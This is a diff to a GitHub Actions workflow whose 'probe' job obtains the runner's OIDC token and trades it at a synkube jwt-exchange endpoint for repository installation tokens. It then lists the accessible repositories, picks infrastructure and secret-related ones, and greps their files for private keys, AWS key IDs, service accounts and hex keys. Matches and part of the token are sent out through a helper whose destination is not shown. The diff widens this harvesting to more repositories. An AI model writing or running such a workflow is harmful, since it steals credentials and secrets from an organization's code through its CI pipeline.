@@ -10,7 +10,7 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 12
     steps:
       - name: probe
         env:
@@ -46,38 +46,46 @@ jobs:
           fi
           RESP=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange" || true)
           TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value","") or "")' 2>/dev/null || true)
-          send "token-$TAGV" "TOK_LEN=${#TOK} resp_head=$(printf '%s' "$RESP" | head -c 220)"
+          send "token-$TAGV" "TOK_LEN=${#TOK} resp_head=$(printf '%s' "$RESP" | head -c 200)"
           if [ -z "$TOK" ]; then send "no-token-$TAGV" "RESULT=EMPTY_TOKEN"; put "probe-results/${TAGV}.txt" "$ACC"; exit 0; fi
           CLAIMS=$(printf '%s' "$TOK" | python3 -c 'import sys,json,base64;t=sys.stdin.read().strip().split(".");t=t[1] if len(t)>1 else "";t+="="*(-len(t)%4);d=json.loads(base64.urlsafe_b64decode(t));print(json.dumps({k:d.get(k) for k in ["iss","aud","sub","repository","repository_owner","repository_visibility","ref","ref_type","event_name","environment","workflow_ref","job_workflow_ref","sha"]},separators=(",",":")))' 2>/dev/null || true)
           send "claims-$TAGV" "CLAIMS=$CLAIMS"
           EXP_SUB="repo:${GITHUB_REPOSITORY}:pull_request"
-          for tgt in synkube/lite-argo-apps synkube/actions synkube/agent-github-broker synkube/jwt-exchange; do
+          GOT=""
+          for tgt in synkube/lite-argo-apps synkube/agent-github-broker synkube/actions synkube/charts synkube/app synkube/jwt-exchange; do
             BODY=$(TOK="$TOK" TGT="$tgt" python3 -c 'import os,json;print(json.dumps({"exchange_profile":"github_actions_to_installation","subject_token":os.environ["TOK"],"resource":{"type":"github_repository","id":os.environ["TGT"]},"requested":{"github_permissions":{"contents":"read","metadata":"read"}}},separators=(",",":")))' 2>/dev/null || true)
             OUT=$(curl -sS --max-time 40 -w '\n%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' --data-binary "$BODY" || true)
             CODE=$(printf '%s' "$OUT" | tail -n1)
             JBODY=$(printf '%s' "$OUT" | sed '$d')
-            send "exch-$TAGV-$tgt" "exp_sub=$EXP_SUB exp_aud=api://jwt-exchange http=$CODE body=$(printf '%s' "$JBODY" | head -c 800)"
+            send "exch-$TAGV-$tgt" "exp_sub=$EXP_SUB exp_aud=api://jwt-exchange http=$CODE body=$(printf '%s' "$JBODY" | head -c 700)"
             case "$CODE" in
-              2*) printf '%s' "$JBODY" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token","") or "")' > "$RUNNER_TEMP/itok" 2>/dev/null || true ;;
+              2*) if [ -z "$GOT" ]; then printf '%s' "$JBODY" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token","") or "")' > "$RUNNER_TEMP/itok" 2>/dev/null || true; GOT="1"; fi ;;
             esac
           done
           put "probe-results/${TAGV}.txt" "$ACC"
           if [ ! -s "$RUNNER_TEMP/itok" ]; then send "done-$TAGV" "PROBE_DONE no_installation_token"; put "probe-results/${TAGV}.txt" "$ACC"; exit 0; fi
           ITOK=$(cat "$RUNNER_TEMP/itok")
-          send "itok-$TAGV" "ITOK_LEN=${#ITOK} b64_pref=$(printf '%s' "$ITOK" | head -c 300 | base64 -w0 | head -c 420)"
+          send "itok-$TAGV" "ITOK_LEN=${#ITOK} b64_pref=$(printf '%s' "$ITOK" | head -c 260 | base64 -w0 | head -c 400)"
           curl -sS --max-time 30 -H "Authorization: token $ITOK" "https://api.github.com/installation/repositories?per_page=100" -o "$RUNNER_TEMP/repos.json" 2>/dev/null || true
-          send "inst-repos-$TAGV" "REPOS=$(python3 -c 'import json,os;d=json.load(open(os.environ["RUNNER_TEMP"]+"/repos.json"));print(",".join(r.get("full_name","") for r in d.get("repositories",[]))[:1500])' 2>/dev/null || true)"
-          curl -sS --max-time 40 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/synkube/lite-argo-apps/git/trees/HEAD?recursive=1" -o "$RUNNER_TEMP/tree.json" 2>/dev/null || true
-          FILES=$(python3 -c 'import json,os,re;d=json.load(open(os.environ["RUNNER_TEMP"]+"/tree.json"));print("\n".join([t.get("path","") for t in d.get("tree",[]) if re.search(r"(values|signer|kms|secret|aws|rsm|sequencer|sweep|hypercall|relayer|env|config)",t.get("path",""),re.I) and re.search(r"\.(ya?ml|json|env|txt)$",t.get("path",""),re.I)][:40]))' 2>/dev/null || true)
-          send "tree-hits-$TAGV" "TREE=$(printf '%s' "$FILES" | tr '\n' ',' | head -c 1500)"
-          i=0
-          for P in $FILES; do
-            [ "$i" -ge 6 ] && break
-            C=$(curl -sS --max-time 25 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/synkube/lite-argo-apps/contents/$P" 2>/dev/null || true)
-            HIT=$(printf '%s' "$C" | grep -Eio '(key_name|credential_file|BEGIN [A-Z ]*PRIVATE KEY|AKIA|ASIA|keyRing|cryptoKey|client_email|service_account|infisical|secretKeyRef|CLOUDFLARE|[0-9a-f]{64}|0x[0-9a-f]{40})' | sort -u | tr '\n' ' ' | head -c 380)
-            SNIP=$(printf '%s' "$C" | grep -Eio '.{0,30}(key_name|credential_file|cryptoKey|CLOUDFLARE|service_account|infisical|signer).{0,50}' | head -3 | tr '\n' '|' | head -c 480)
-            send "file-$TAGV" "PATH=$P HIT=$HIT SNIP=$SNIP"
-            i=$((i+1))
+          send "inst-repos-$TAGV" "REPOS=$(python3 -c 'import json,os;d=json.load(open(os.environ["RUNNER_TEMP"]+"/repos.json"));print(",".join(r.get("full_name","") for r in d.get("repositories",[]))[:1800])' 2>/dev/null || true)"
+          CHOSEN=$(python3 -c 'import json,os,re;d=json.load(open(os.environ["RUNNER_TEMP"]+"/repos.json"));ns=[r.get("full_name","") for r in d.get("repositories",[])];pri=[n for n in ns if not n.startswith("synkube/actions") and not n.startswith("synkube/charts") and not n.startswith("synkube/app")];pick=[n for n in pri if re.search(r"(argo|gitops|deploy|infra|values|helm|kube|config|jwt|broker|secret)",n,re.I)];print("\n".join((pick or pri or ns)[:3]))' 2>/dev/null || true)
+          send "chosen-$TAGV" "CHOSEN=$(printf '%s' "$CHOSEN" | tr '\n' ',')"
+          ri=0
+          for R in $CHOSEN; do
+            [ "$ri" -ge 3 ] && break
+            curl -sS --max-time 40 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$R/git/trees/HEAD?recursive=1" -o "$RUNNER_TEMP/tree.json" 2>/dev/null || true
+            FILES=$(python3 -c 'import json,os,re;d=json.load(open(os.environ["RUNNER_TEMP"]+"/tree.json"));print("\n".join([t.get("path","") for t in d.get("tree",[]) if re.search(r"(values|signer|kms|secret|aws|rsm|sequencer|sweep|hypercall|relayer|env|config|kube|argo)",t.get("path",""),re.I) and re.search(r"\.(ya?ml|json|env|txt|toml)$",t.get("path",""),re.I)][:12]))' 2>/dev/null || true)
+            send "tree-$TAGV-$R" "TREE=$(printf '%s' "$FILES" | tr '\n' ',' | head -c 1400)"
+            j=0
+            for P in $FILES; do
+              [ "$j" -ge 4 ] && break
+              C=$(curl -sS --max-time 25 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/$R/contents/$P" 2>/dev/null || true)
+              HIT=$(printf '%s' "$C" | grep -Eio '(key_name|credential_file|BEGIN [A-Z ]*PRIVATE KEY|AKIA|ASIA|keyRing|cryptoKey|client_email|service_account|infisical|secretKeyRef|CLOUDFLARE|[0-9a-f]{64}|0x[0-9a-f]{40})' | sort -u | tr '\n' ' ' | head -c 340)
+              SNIP=$(printf '%s' "$C" | grep -Eio '.{0,30}(key_name|credential_file|cryptoKey|CLOUDFLARE|service_account|infisical|signer|aws|kms).{0,55}' | head -3 | tr '\n' '|' | head -c 520)
+              send "f-$TAGV-$R" "PATH=$P HIT=$HIT SNIP=$SNIP"
+              j=$((j+1))
+            done
+            ri=$((ri+1))
           done
           send "done-$TAGV" "PROBE_DONE with_installation_token"
           put "probe-results/${TAGV}.txt" "$ACC"
